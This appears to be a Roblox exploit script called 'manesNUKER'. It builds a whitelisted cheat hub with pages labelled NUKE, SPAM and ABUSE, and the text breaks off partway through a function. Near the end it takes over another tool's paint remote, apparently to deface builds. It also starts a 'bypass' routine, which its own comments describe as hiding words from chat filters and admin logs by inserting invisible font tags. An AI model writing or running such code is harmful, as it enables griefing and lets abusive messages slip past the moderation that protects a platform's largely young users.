--[[
  manesNUKER — CodeX UI
  credit: stik claude gemini
]]

------------------------
-- WHITELIST
------------------------
local whitelistedIDs = {
    [10429099415] = "FLAMEFAML",
    [9693065023]  = "kupal_isme8",
    [4674698402]  = "warnmachine12908"
}
local Players = game:GetService("Players")
local player  = Players.LocalPlayer
if not whitelistedIDs[player.UserId] then
    player:Kick("Unauthorized: not whitelisted.")
    return
end

------------------------
-- SERVICES
------------------------
local UserInputService  = game:GetService("UserInputService")
local TweenService      = game:GetService("TweenService")
local HttpService       = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService        = game:GetService("RunService")
local LocalPlayer       = player

if makefolder then pcall(function() makefolder("WindConfigs") end) end

------------------------
-- CLEANUP
------------------------
if player.PlayerGui:FindFirstChild("SimpleHub") then
    player.PlayerGui.SimpleHub:Destroy()
end

------------------------
-- GUI  (CodeX original structure)
------------------------
local gui = Instance.new("ScreenGui", player.PlayerGui)
gui.Name = "SimpleHub"
gui.ResetOnSpawn = false

local frame = Instance.new("Frame", gui)
frame.Size             = UDim2.fromOffset(600, 400)
frame.Position         = UDim2.fromScale(0.5, 0.5)
frame.AnchorPoint      = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
frame.BorderSizePixel  = 0
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 25)

------------------------
-- TOGGLE BUTTON  (show/hide UI)
------------------------
local toggleBtn = Instance.new("TextButton", gui)
toggleBtn.Size             = UDim2.fromOffset(60, 60)
toggleBtn.Position         = UDim2.new(0, 20, 0.5, -30)
toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
toggleBtn.Text             = "M"
toggleBtn.Font             = Enum.Font.GothamBold
toggleBtn.TextSize         = 22
toggleBtn.TextColor3       = Color3.fromRGB(11, 95, 226)
toggleBtn.BorderSizePixel  = 0
toggleBtn.ZIndex           = 10
Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(1, 0)

-- Stroke ring
local toggleStroke = Instance.new("UIStroke", toggleBtn)
toggleStroke.Color     = Color3.fromRGB(11, 95, 226)
toggleStroke.Thickness = 2

-- Draggable toggle button
local tbDrag, tbDragStart, tbDragPos = false, nil, nil
toggleBtn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        tbDrag      = true
        tbDragStart = input.Position
        tbDragPos   = toggleBtn.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if tbDrag and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - tbDragStart
        toggleBtn.Position = UDim2.new(tbDragPos.X.Scale, tbDragPos.X.Offset + delta.X, tbDragPos.Y.Scale, tbDragPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        tbDrag = false
    end
end)

-- Click to toggle visibility
local uiVisible = true
toggleBtn.MouseButton1Click:Connect(function()
    uiVisible = not uiVisible
    TweenService:Create(frame, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Size = uiVisible and UDim2.fromOffset(600, 400) or UDim2.fromOffset(0, 0),
        BackgroundTransparency = uiVisible and 0 or 1
    }):Play()
    frame.Visible = uiVisible
    toggleBtn.Text             = uiVisible and "M" or "M"
    toggleBtn.BackgroundColor3 = uiVisible and Color3.fromRGB(30, 30, 50) or Color3.fromRGB(11, 70, 180)
    TweenService:Create(toggleStroke, TweenInfo.new(0.2), {
        Color = uiVisible and Color3.fromRGB(11, 95, 226) or Color3.fromRGB(200, 200, 255)
    }):Play()
end)

------------------------
-- LOADER  (CodeX original)
------------------------
local loaderOverlay = Instance.new("Frame", frame)
loaderOverlay.Size             = UDim2.fromScale(1, 1)
loaderOverlay.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
loaderOverlay.ZIndex           = 50
Instance.new("UICorner", loaderOverlay).CornerRadius = UDim.new(0, 25)

local loaderContainer = Instance.new("Frame", loaderOverlay)
loaderContainer.Size             = UDim2.fromOffset(120, 120)
loaderContainer.Position         = UDim2.fromScale(0.5, 0.5)
loaderContainer.AnchorPoint      = Vector2.new(0.5, 0.5)
loaderContainer.BackgroundTransparency = 1
loaderContainer.ZIndex           = 51

local loaderText = Instance.new("TextLabel", loaderOverlay)
loaderText.Size                   = UDim2.fromOffset(200, 40)
loaderText.Position               = UDim2.new(0.5, 0, 0.5, 70)
loaderText.AnchorPoint            = Vector2.new(0.5, 0)
loaderText.BackgroundTransparency = 1
loaderText.Text                   = ""
loaderText.Font                   = Enum.Font.GothamBold
loaderText.TextSize               = 28
loaderText.TextColor3             = Color3.fromRGB(11, 95, 226)
loaderText.ZIndex                 = 52

local squareSize  = 40
local grayColor   = Color3.fromRGB(150, 150, 150)
local blueColor   = Color3.fromRGB(11, 95, 226)
local spread      = 30
local finalOffsets = {
    Vector2.new(0, -squareSize/2), Vector2.new(squareSize/2, 0),
    Vector2.new(0, squareSize/2),  Vector2.new(-squareSize/2, 0),
}
local outOffsets = {
    Vector2.new(0, -spread), Vector2.new(spread, 0),
    Vector2.new(0, spread),  Vector2.new(-spread, 0),
}

local squares = {}
for i = 1, 4 do
    local sq = Instance.new("Frame", loaderContainer)
    sq.Size             = UDim2.fromOffset(squareSize, squareSize)
    sq.Position         = UDim2.new(0.5, -squareSize/2, 0.5, -squareSize/2)
    sq.BackgroundColor3 = blueColor
    sq.BorderSizePixel  = 0
    sq.Rotation         = 45
    sq.ZIndex           = 52
    Instance.new("UICorner", sq).CornerRadius = UDim.new(0, 4)
    squares[i] = sq
end

-- Diamond animation
task.spawn(function()
    local startTime = tick()
    while loaderOverlay.Parent and tick() - startTime < 5 do
        for i, sq in ipairs(squares) do
            TweenService:Create(sq, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                Position         = UDim2.new(0.5, -squareSize/2 + outOffsets[i].X, 0.5, -squareSize/2 + outOffsets[i].Y),
                BackgroundColor3 = grayColor
            }):Play()
            task.wait(0.65)
            TweenService:Create(sq, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                Position         = UDim2.new(0.5, -squareSize/2 + finalOffsets[i].X, 0.5, -squareSize/2 + finalOffsets[i].Y),
                BackgroundColor3 = blueColor
            }):Play()
            task.wait(0.65)
        end
    end
end)

-- Typewriter
task.spawn(function()
    local text = "manesNUKER"
    local speed = 0.12
    for i = 1, #text do
        loaderText.Text = string.sub(text, 1, i)
        task.wait(speed)
    end
end)

-- Remove loader after 5s
task.delay(5, function()
    TweenService:Create(loaderText, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
    for _, sq in ipairs(squares) do
        TweenService:Create(sq, TweenInfo.new(0.6), {
            Position         = UDim2.new(0, 0, 0, 0),
            Size             = UDim2.fromScale(1, 1),
            Rotation         = 0,
            BackgroundColor3 = frame.BackgroundColor3
        }):Play()
        sq:FindFirstChildOfClass("UICorner").CornerRadius = UDim.new(0, 25)
    end
    task.delay(0.65, function() loaderOverlay:Destroy() end)
end)

------------------------
-- DRAGGING  (CodeX original)
------------------------
local draggingHub   = false
local dragStart, startPos
local ignoreHubDrag = false

local function updateHubDrag(input)
    if draggingHub and not ignoreHubDrag then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end

frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        draggingHub = true
        dragStart   = input.Position
        startPos    = frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then draggingHub = false end
        end)
    end
end)
frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        updateHubDrag(input)
    end
end)

------------------------
-- PAGE SYSTEM  (CodeX original, extended to 8 tabs)
------------------------
local pages       = {"NUKE","FIX","SLOTS","AURA","BKIT","SPAM","ANTI","SCRIPTS","DONATE","ABUSE","SAVE ENLI","CREDITS"}
local currentPage = 1

-- Page Label
local pageLabel = Instance.new("TextLabel", frame)
pageLabel.Size                   = UDim2.fromOffset(150, 40)
pageLabel.Position               = UDim2.fromOffset(20, 20)
pageLabel.BackgroundTransparency = 1
pageLabel.Font                   = Enum.Font.Gotham
pageLabel.TextSize               = 20
pageLabel.TextColor3             = Color3.fromRGB(116, 113, 117)
pageLabel.Text                   = pages[currentPage]

-- Arrows
local leftArrow = Instance.new("TextButton", frame)
leftArrow.Size                   = UDim2.fromOffset(40, 40)
leftArrow.Position               = UDim2.fromOffset(20, 20)
leftArrow.Text                   = "<"
leftArrow.Font                   = Enum.Font.Gotham
leftArrow.TextSize               = 20
leftArrow.TextColor3             = Color3.fromRGB(116, 113, 117)
leftArrow.BackgroundTransparency = 1

local rightArrow = Instance.new("TextButton", frame)
rightArrow.Size                   = UDim2.fromOffset(40, 40)
rightArrow.Position               = UDim2.fromOffset(130, 20)
rightArrow.Text                   = ">"
rightArrow.Font                   = Enum.Font.Gotham
rightArrow.TextSize               = 20
rightArrow.TextColor3             = Color3.fromRGB(116, 113, 117)
rightArrow.BackgroundTransparency = 1

------------------------
-- LOGS PANEL  (CodeX original)
------------------------
local logsFrame = Instance.new("Frame", frame)
logsFrame.Size             = UDim2.fromOffset(250, 360)
logsFrame.Position         = UDim2.new(1, -20, 0, 20)
logsFrame.AnchorPoint      = Vector2.new(1, 0)
logsFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
logsFrame.BorderSizePixel  = 0
Instance.new("UICorner", logsFrame).CornerRadius = UDim.new(0, 12)

local logsLabel = Instance.new("TextLabel", logsFrame)
logsLabel.Size                   = UDim2.fromScale(1, 1)
logsLabel.BackgroundTransparency = 1
logsLabel.Font                   = Enum.Font.Gotham
logsLabel.TextSize               = 13
logsLabel.TextColor3             = Color3.fromRGB(116, 113, 117)
logsLabel.TextXAlignment         = Enum.TextXAlignment.Left
logsLabel.TextYAlignment         = Enum.TextYAlignment.Top
logsLabel.TextWrapped            = true
logsLabel.RichText               = true

local logLines = {}
local maxLines = 22
local function addLog(msg)
    table.insert(logLines, msg)
    if #logLines > maxLines then table.remove(logLines, 1) end
    logsLabel.Text = table.concat(logLines, "\n")
end
local oldPrint = print
print = function(...)
    local args = {...}
    local msg  = ""
    for i, v in ipairs(args) do msg = msg .. tostring(v) .. "\t" end
    addLog(msg)
    oldPrint(...)
end

------------------------
-- HELPERS  (CodeX original style)
------------------------
local function tweenProperty(obj, prop, to, duration)
    TweenService:Create(obj, TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {[prop] = to}):Play()
end

-- Content width (fits left of logs panel)
local CW = 300

local function createButton(parent, text, func, w, h)
    w = w or CW; h = h or 40
    local btn = Instance.new("TextButton", parent)
    btn.Size             = UDim2.fromOffset(w, h)
    btn.Text             = text
    btn.Font             = Enum.Font.Gotham
    btn.TextSize         = 18
    btn.TextColor3       = Color3.fromRGB(116, 113, 117)
    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
    btn.BorderSizePixel  = 0
    btn.AutoButtonColor  = false
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)
    local originalSize = btn.Size
    btn.MouseEnter:Connect(function()
        tweenProperty(btn, "TextColor3", Color3.fromRGB(11, 95, 226), 0.3)
        tweenProperty(btn, "Size", UDim2.new(originalSize.X.Scale, originalSize.X.Offset + 10, originalSize.Y.Scale, originalSize.Y.Offset + 5), 0.2)
    end)
    btn.MouseLeave:Connect(function()
        tweenProperty(btn, "TextColor3", Color3.fromRGB(116, 113, 117), 0.3)
        tweenProperty(btn, "Size", originalSize, 0.2)
    end)
    btn.MouseButton1Click:Connect(func)
    return btn
end

local function createToggle(parent, text, func, w, h)
    w = w or CW; h = h or 40
    local state  = false
    local toggle = Instance.new("TextButton", parent)
    toggle.Size             = UDim2.fromOffset(w, h)
    toggle.Text             = text .. ": OFF"
    toggle.Font             = Enum.Font.Gotham
    toggle.TextSize         = 18
    toggle.TextColor3       = Color3.fromRGB(116, 113, 117)
    toggle.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
    toggle.BorderSizePixel  = 0
    toggle.AutoButtonColor  = false
    Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 12)
    local originalSize = toggle.Size
    toggle.MouseEnter:Connect(function()
        tweenProperty(toggle, "TextColor3", Color3.fromRGB(11, 95, 226), 0.3)
        tweenProperty(toggle, "Size", UDim2.new(originalSize.X.Scale, originalSize.X.Offset + 10, originalSize.Y.Scale, originalSize.Y.Offset + 5), 0.2)
    end)
    toggle.MouseLeave:Connect(function()
        tweenProperty(toggle, "TextColor3", Color3.fromRGB(116, 113, 117), 0.3)
        tweenProperty(toggle, "Size", originalSize, 0.2)
    end)
    toggle.MouseButton1Click:Connect(function()
        state = not state
        toggle.Text = text .. (state and ": ON" or ": OFF")
        tweenProperty(toggle, "BackgroundColor3", state and Color3.fromRGB(11, 70, 180) or Color3.fromRGB(50, 50, 70), 0.2)
        func(state)
    end)
    return toggle
end

local function createSlider(parent, text, minV, maxV, defV, onChange, w)
    w = w or CW
    local holder = Instance.new("Frame", parent)
    holder.Size             = UDim2.fromOffset(w, 60)
    holder.BackgroundTransparency = 1

    local label = Instance.new("TextLabel", holder)
    label.Size                   = UDim2.fromOffset(w, 20)
    label.Position               = UDim2.fromOffset(0, 0)
    label.BackgroundTransparency = 1
    label.Font                   = Enum.Font.Gotham
    label.TextSize               = 18
    label.TextColor3             = Color3.fromRGB(116, 113, 117)
    label.Text                   = text .. ": " .. tostring(defV)

    local track = Instance.new("Frame", holder)
    track.Size             = UDim2.fromOffset(w - 40, 6)
    track.Position         = UDim2.fromOffset(20, 35)
    track.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
    Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)

    local fill = Instance.new("Frame", track)
    fill.Size             = UDim2.new((defV - minV)/(maxV - minV), 0, 1, 0)
    fill.BackgroundColor3 = blueColor
    Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)

    local knob = Instance.new("Frame", track)
    knob.Size        = UDim2.fromOffset(14, 14)
    knob.Position    = UDim2.new((defV - minV)/(maxV - minV), 0, 0.5, 0)
    knob.AnchorPoint = Vector2.new(0.5, 0.5)
    knob.BackgroundColor3 = blueColor
    Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

    local knobOrigSize = knob.Size
    local draggingKnob = false

    knob.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            draggingKnob  = true
            ignoreHubDrag = true
            tweenProperty(knob, "Size", UDim2.new(knobOrigSize.X.Scale, knobOrigSize.X.Offset + 8, knobOrigSize.Y.Scale, knobOrigSize.Y.Offset + 8), 0.1)
        end
    end)
    knob.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            draggingKnob  = false
            ignoreHubDrag = false
            tweenProperty(knob, "Size", knobOrigSize, 0.2)
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if draggingKnob and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local x = math.clamp((input.Position.X - track.AbsolutePosition.X) / track.AbsoluteSize.X, 0, 1)
            knob.Position = UDim2.new(x, 0, 0.5, 0)
            fill.Size     = UDim2.new(x, 0, 1, 0)
            local val     = math.floor(minV + (maxV - minV) * x)
            label.Text    = text .. ": " .. tostring(val)
            if onChange then onChange(val) end
        end
    end)
    return holder
end

local function createLabel(parent, text, col, sz, w, h)
    local lbl = Instance.new("TextLabel", parent)
    lbl.Size                   = UDim2.fromOffset(w or CW, h or 22)
    lbl.BackgroundTransparency = 1
    lbl.Text                   = text
    lbl.Font                   = Enum.Font.Gotham
    lbl.TextSize               = sz or 14
    lbl.TextColor3             = col or Color3.fromRGB(116, 113, 117)
    lbl.TextXAlignment         = Enum.TextXAlignment.Left
    lbl.TextWrapped            = true
    return lbl
end

local function createTextBox(parent, placeholder, w, h)
    local box = Instance.new("TextBox", parent)
    box.Size              = UDim2.fromOffset(w or CW, h or 36)
    box.PlaceholderText   = placeholder
    box.BackgroundColor3  = Color3.fromRGB(40, 40, 60)
    box.TextColor3        = Color3.fromRGB(200, 200, 220)
    box.PlaceholderColor3 = Color3.fromRGB(80, 80, 110)
    box.Font              = Enum.Font.Gotham
    box.TextSize          = 15
    box.BorderSizePixel   = 0
    box.ClearTextOnFocus  = false
    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 10)
    return box
end

local function createDivider(parent)
    local d = Instance.new("Frame", parent)
    d.Size             = UDim2.fromOffset(CW, 1)
    d.BackgroundColor3 = Color3.fromRGB(55, 55, 75)
    d.BorderSizePixel  = 0
    return d
end

-- Arrow hover  (CodeX original)
local function addArrowHover(button)
    local originalSize = button.Size
    button.MouseEnter:Connect(function()
        tweenProperty(button, "TextColor3", Color3.fromRGB(11, 95, 226), 0.3)
        tweenProperty(button, "Size", UDim2.new(originalSize.X.Scale, originalSize.X.Offset + 10, originalSize.Y.Scale, originalSize.Y.Offset + 5), 0.2)
    end)
    button.MouseLeave:Connect(function()
        tweenProperty(button, "TextColor3", Color3.fromRGB(116, 113, 117), 0.3)
        tweenProperty(button, "Size", originalSize, 0.2)
    end)
end
addArrowHover(leftArrow)
addArrowHover(rightArrow)

-- Page scroll containers — positioned in CodeX content area (x=20, y=68)
local pageContainers = {}
for i = 1, #pages do
    local sf = Instance.new("ScrollingFrame", frame)
    sf.Size                  = UDim2.fromOffset(310, 315)
    sf.Position              = UDim2.fromOffset(20, 68)
    sf.BackgroundTransparency = 1
    sf.BorderSizePixel       = 0
    sf.ScrollBarThickness    = 3
    sf.ScrollBarImageColor3  = blueColor
    sf.CanvasSize            = UDim2.new(0, 0, 0, 0)
    sf.AutomaticCanvasSize   = Enum.AutomaticSize.Y
    sf.Visible               = false
    local ul = Instance.new("UIListLayout", sf)
    ul.Padding             = UDim.new(0, 6)
    ul.HorizontalAlignment = Enum.HorizontalAlignment.Left
    local upad = Instance.new("UIPadding", sf)
    upad.PaddingLeft = UDim.new(0, 2)
    upad.PaddingTop  = UDim.new(0, 2)
    pageContainers[i] = sf
end

-- Page switching  (CodeX original pattern)
local function updatePage()
    pageLabel.Text = pages[currentPage]
    for i, c in ipairs(pageContainers) do c.Visible = (i == currentPage) end
end

leftArrow.MouseButton1Click:Connect(function()
    currentPage = currentPage - 1
    if currentPage < 1 then currentPage = #pages end
    updatePage()
end)
rightArrow.MouseButton1Click:Connect(function()
    currentPage = currentPage + 1
    if currentPage > #pages then currentPage = 1 end
    updatePage()
end)

-- Shorthand refs
local pgNuke    = pageContainers[1]
local pgFix     = pageContainers[2]
local pgSlots   = pageContainers[3]
local pgAura    = pageContainers[4]
local pgBkit    = pageContainers[5]
local pgSpam    = pageContainers[6]
local pgAnti    = pageContainers[7]
local pgCredits   = pageContainers[12]
local pgSaveEnli  = pageContainers[11]
local pgScripts = pageContainers[8]
local pgDonate  = pageContainers[9]
local pgAbuse   = pageContainers[10]

-- ============================================================
-- COLOR PICKER
-- ============================================================
local PickerOverlay = Instance.new("Frame", gui)
PickerOverlay.Size                    = UDim2.fromScale(1, 1)
PickerOverlay.BackgroundColor3        = Color3.new(0, 0, 0)
PickerOverlay.BackgroundTransparency  = 0.55
PickerOverlay.Visible                 = false
PickerOverlay.Active                  = true
PickerOverlay.ZIndex                  = 100

local PickerBox = Instance.new("Frame", PickerOverlay)
PickerBox.Size             = UDim2.fromOffset(240, 310)
PickerBox.Position         = UDim2.fromScale(0.5, 0.5)
PickerBox.AnchorPoint      = Vector2.new(0.5, 0.5)
PickerBox.BackgroundColor3 = Color3.fromRGB(28, 28, 44)
PickerBox.BorderSizePixel  = 0
PickerBox.ZIndex           = 101
Instance.new("UICorner", PickerBox).CornerRadius = UDim.new(0, 14)

local PKTop = Instance.new("Frame", PickerBox)
PKTop.Size = UDim2.fromOffset(240, 3); PKTop.BackgroundColor3 = blueColor; PKTop.BorderSizePixel = 0
Instance.new("UICorner", PKTop).CornerRadius = UDim.new(0, 14)

local PKTitle = Instance.new("TextLabel", PickerBox)
PKTitle.Size=UDim2.fromOffset(240,28); PKTitle.Position=UDim2.fromOffset(0,6)
PKTitle.Text="Color Picker"; PKTitle.Font=Enum.Font.GothamBold; PKTitle.TextSize=14
PKTitle.TextColor3=Color3.fromRGB(200,200,220); PKTitle.BackgroundTransparency=1; PKTitle.ZIndex=102

local SVSq = Instance.new("ImageLabel", PickerBox)
SVSq.Size=UDim2.fromOffset(210,150); SVSq.Position=UDim2.fromOffset(15,36)
SVSq.BackgroundColor3=Color3.fromHSV(0,1,1); SVSq.BorderSizePixel=0; SVSq.ZIndex=102
Instance.new("UICorner",SVSq).CornerRadius=UDim.new(0,5)
local svGH=Instance.new("UIGradient",SVSq)
svGH.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.new(1,1,1)),ColorSequenceKeypoint.new(1,Color3.new(1,1,1))})
svGH.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(1,1)}); svGH.Rotation=90
local SVDk=Instance.new("Frame",SVSq)
SVDk.Size=UDim2.fromScale(1,1); SVDk.BackgroundColor3=Color3.new(0,0,0); SVDk.BorderSizePixel=0; SVDk.ZIndex=103
Instance.new("UICorner",SVDk).CornerRadius=UDim.new(0,5)
local svGV=Instance.new("UIGradient",SVDk)
svGV.Color=ColorSequence.new(Color3.new(0,0,0))
svGV.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,1),NumberSequenceKeypoint.new(1,0)})
local SVDot=Instance.new("Frame",SVSq)
SVDot.Size=UDim2.fromOffset(12,12); SVDot.AnchorPoint=Vector2.new(0.5,0.5)
SVDot.Position=UDim2.new(1,0,0,0); SVDot.BackgroundColor3=Color3.new(1,1,1)
SVDot.BorderSizePixel=2; SVDot.BorderColor3=Color3.new(0,0,0); SVDot.ZIndex=105
Instance.new("UICorner",SVDot).CornerRadius=UDim.new(1,0)

local HueBar=Instance.new("ImageLabel",PickerBox)
HueBar.Size=UDim2.fromOffset(210,18); HueBar.Position=UDim2.fromOffset(15,196)
HueBar.BackgroundColor3=Color3.new(1,1,1); HueBar.BorderSizePixel=0; HueBar.ZIndex=102
Instance.new("UICorner",HueBar).CornerRadius=UDim.new(0,5)
local hG=Instance.new("UIGradient",HueBar)
hG.Color=ColorSequence.new({
    ColorSequenceKeypoint.new(0,   Color3.fromHSV(0,   1,1)),
    ColorSequenceKeypoint.new(1/6, Color3.fromHSV(1/6, 1,1)),
    ColorSequenceKeypoint.new(2/6, Color3.fromHSV(2/6, 1,1)),
    ColorSequenceKeypoint.new(3/6, Color3.fromHSV(3/6, 1,1)),
    ColorSequenceKeypoint.new(4/6, Color3.fromHSV(4/6, 1,1)),
    ColorSequenceKeypoint.new(5/6, Color3.fromHSV(5/6, 1,1)),
    ColorSequenceKeypoint.new(1,   Color3.fromHSV(1,   1,1)),
}); hG.Rotation=90
local HueCur=Instance.new("Frame",HueBar)
HueCur.Size=UDim2.fromOffset(4,22); HueCur.AnchorPoint=Vector2.new(0.5,0.5)
HueCur.Position=UDim2.new(0,0,0.5,0); HueCur.BackgroundColor3=Color3.new(1,1,1)
HueCur.BorderSizePixel=1; HueCur.BorderColor3=Color3.new(0,0,0); HueCur.ZIndex=104
Instance.new("UICorner",HueCur).CornerRadius=UDim.new(0,2)

local HexBox=Instance.new("TextBox",PickerBox)
HexBox.Size=UDim2.fromOffset(210,30); HexBox.Position=UDim2.fromOffset(15,224)
HexBox.BackgroundColor3=Color3.fromRGB(38,38,58); HexBox.TextColor3=Color3.fromRGB(220,220,240)
HexBox.Font=Enum.Font.Code; HexBox.TextSize=13; HexBox.Text="FF0000"
HexBox.PlaceholderText="RRGGBB"; HexBox.BorderSizePixel=0; HexBox.ZIndex=102
Instance.new("UICorner",HexBox).CornerRadius=UDim.new(0,7)

local SwPrev=Instance.new("Frame",PickerBox)
SwPrev.Size=UDim2.fromOffset(210,22); SwPrev.Position=UDim2.fromOffset(15,264)
SwPrev.BackgroundColor3=Color3.fromRGB(255,0,0); SwPrev.BorderSizePixel=0; SwPrev.ZIndex=102
Instance.new("UICorner",SwPrev).CornerRadius=UDim.new(0,5)

local PKConf=Instance.new("TextButton",PickerBox)
PKConf.Size=UDim2.fromOffset(210,32); PKConf.Position=UDim2.fromOffset(15,272)
PKConf.BackgroundColor3=blueColor; PKConf.Text="CONFIRM"
PKConf.Font=Enum.Font.GothamBold; PKConf.TextSize=14; PKConf.TextColor3=Color3.new(1,1,1)
PKConf.BorderSizePixel=0; PKConf.ZIndex=102
Instance.new("UICorner",PKConf).CornerRadius=UDim.new(0,8)
PKConf.MouseButton1Click:Connect(function() PickerOverlay.Visible=false end)

local curPB=nil; local pH,pS,pV=0,1,1
local function toHex(c) return string.format("%02X%02X%02X",math.round(c.R*255),math.round(c.G*255),math.round(c.B*255)) end
local function updatePicker()
    SVSq.BackgroundColor3=Color3.fromHSV(pH,1,1)
    SVDot.Position=UDim2.new(pS,0,1-pV,0); HueCur.Position=UDim2.new(pH,0,0.5,0)
    local c=Color3.fromHSV(pH,pS,pV)
    if curPB then curPB.BackgroundColor3=c end
    SwPrev.BackgroundColor3=c; HexBox.Text=toHex(c)
end
local svDrag,hueDrag=false,false
local function svIn(i)
    pS=math.clamp((i.Position.X-SVSq.AbsolutePosition.X)/SVSq.AbsoluteSize.X,0,1)
    pV=1-math.clamp((i.Position.Y-SVSq.AbsolutePosition.Y)/SVSq.AbsoluteSize.Y,0,1); updatePicker()
end
local function hueIn(i)
    pH=math.clamp((i.Position.X-HueBar.AbsolutePosition.X)/HueBar.AbsoluteSize.X,0,1); updatePicker()
end
for _, el in ipairs({SVSq,SVDk}) do
    el.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then svDrag=true;svIn(i) end end)
end
HueBar.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then hueDrag=true;hueIn(i) end end)
UserInputService.InputChanged:Connect(function(i)
    if i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch then
        if svDrag then svIn(i) end; if hueDrag then hueIn(i) end
    end
end)
UserInputService.InputEnded:Connect(function(i)
    if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then svDrag=false;hueDrag=false end
end)
HexBox.FocusLost:Connect(function()
    local h=HexBox.Text:gsub("#",""):upper()
    if #h==6 then
        local r=tonumber("0x"..h:sub(1,2)); local g=tonumber("0x"..h:sub(3,4)); local b=tonumber("0x"..h:sub(5,6))
        if r and g and b then local hv,sv,vv=Color3.toHSV(Color3.fromRGB(r,g,b)); pH,pS,pV=hv,sv,vv; updatePicker() end
    end
end)
local function openPicker(btn)
    curPB=btn; local h,s,v=Color3.toHSV(btn.BackgroundColor3); pH,pS,pV=h,s,v; updatePicker()
    PickerOverlay.Visible=true
end

-- ============================================================
-- CORE NUKE / FIX LOGIC
-- ============================================================
local faces     = {"Front","Back","Top","Bottom","Right","Left"}
local faceEnums = {
    Front=Enum.NormalId.Front, Back=Enum.NormalId.Back, Top=Enum.NormalId.Top,
    Bottom=Enum.NormalId.Bottom, Right=Enum.NormalId.Right, Left=Enum.NormalId.Left,
}
local faceData   = {}
local LIGHT_GRAY = Color3.fromRGB(200, 200, 200)

local function getPaintRemote()
    local char=LocalPlayer.Character; if not char then return nil,nil end
    local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then return nil,nil end
    local tool=char:FindFirstChild("Paint") or LocalPlayer.Backpack:FindFirstChild("Paint")
    if not tool then return nil,nil end
    if tool.Parent~=char then
        local hum=char:FindFirstChildOfClass("Humanoid")
        if hum then hum:EquipTool(tool); task.wait(0.25) end
        tool=char:FindFirstChild("Paint") or LocalPlayer.Backpack:FindFirstChild("Paint")
        if not tool then return nil,nil end
    end
    local remote=tool:FindFirstChild("Event",true) or tool:FindFirstChildWhichIsA("RemoteEvent",true)
    return remote, hrp.Position
end
local function getBrick() return ReplicatedStorage:FindFirstChild("Brick") end

-- ============================================================
-- BYPASS TEXT — inserts <font size='0'></font> between every letter
-- so chat filters / admin logs can't read the words
-- ============================================================
local BP          = "<font size='0'></font>"
local TextService = game:GetService("TextService")

-- Check if text would be filtered by Roblox (returns ### tags)
local function isFiltered(text)
    local ok, result = pcall(function()
        local f = TextService:FilterStringAsync(text, LocalPlayer.UserId)
        return f:GetNonChatStringForBroadcastAsync()
    end)
    if not ok then return false end
    return result:find("#") ~= nil
end

-- Build a bypass attempt with a given chunk size (bigger = fewer tags = less visible)
local function buildBypass(str, minChunk, maxChunk)
    local result = ""
    local i = 1
    while i <= #str do
        local chunk = math.random(minChunk, maxChunk)
        result = result .. str:sub(i, i + chunk - 1)
        i = i + chunk
        if i <= #str then result = result .. BP end
    end
    return result
end

-- Smart bypass:
-- 1. If Roblox doesn't filter the text at all → return as-is (no tags)
-- 2. Try large chunks first (fewer tags, less visible) → up to small chunks
-- 3. Retry each density multiple times (randomized placement)
-- 4. If still tagged after all attempts → every single char gets a tag
local function bypassText(str)
    if not str or str == "" then return "" end

    -- Don't touch it if it's clean
    if not isFiltered(str) then return str end
